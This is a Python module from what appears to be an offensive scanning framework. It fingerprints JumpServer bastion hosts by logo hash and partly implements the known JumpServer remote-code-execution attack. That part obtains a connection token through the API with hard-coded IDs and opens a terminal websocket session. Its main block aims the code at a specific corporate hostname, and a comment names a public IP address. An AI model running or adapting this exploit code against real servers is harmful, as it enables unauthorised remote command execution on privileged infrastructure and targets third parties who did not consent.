# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-11 21:29
import hashlib
import json

import websockets

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


class Script(BaseScript):
    name = 'JumpServer'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = 'https://github.com/gardenWhy/JumpServer_RCE'
        # 特定路径判断
        self.detectPathList = ['/static/img/logo.png']
        # exec
        self.execPathList = ['/api/v1/authentication/connection-token/?user-only=1']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = ''' verion:
        JumpServer < v2.6.2
        JumpServer < v2.5.4
        JumpServer < v2.4.5
        JumpServer = v1.5.9
        '''
        self.favicon = ['d5d914f5db9cf9b5283ab4d9e35c59ff']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('JumpServer Finger', url))
                                    return {'name': 'JumpServer', 'url': url, 'software': 'JumpServer'}
        except Exception:
            return None

    # 参考攻击模块，这个代码写的比较好 https://blog.csdn.net/weixin_39811856/article/details/113525166

    # 攻击模块没有写，只写了检测模块
    async def exec(self):
        try:
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    data = {
                        "user": "cc20c199fd8a4359b81ae157937ea065",
                        "asset": "59e53d862fa048e4ad8d98156656338f",
                        "system_user": "a91524ca3393493b9ed5cf50e6d1c7af",
                    }
                    async with session.post(url=url, data=data, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.json()
                            if text.get('token'):
                                token = text.get('token')
                                target2 = f'ws://{self.target}/koko/ws/token/?target_id={token}'
                                async with websockets.connect(target2) as client:
                                    recvText = await client.recv()
                                    session_id = json.loads(recvText)["id"]
                                    print("get ws id:" + session_id)
                                    print("###############")
                                    print("init ws")
                                    print("###############")
                                    initText = json.dumps(
                                        {
                                            "id": session_id,
                                            "type": "TERMINAL_INIT",
                                            "data": '{"cols":164,"rows":17}',
                                        }
                                    )
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            # if self.flag:
            #     b = await self.exec()
            #     if b is not None:
            #         self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://47.101.186.96:8443/static/img/logo.png', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('jump.test.geelytravel.com', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
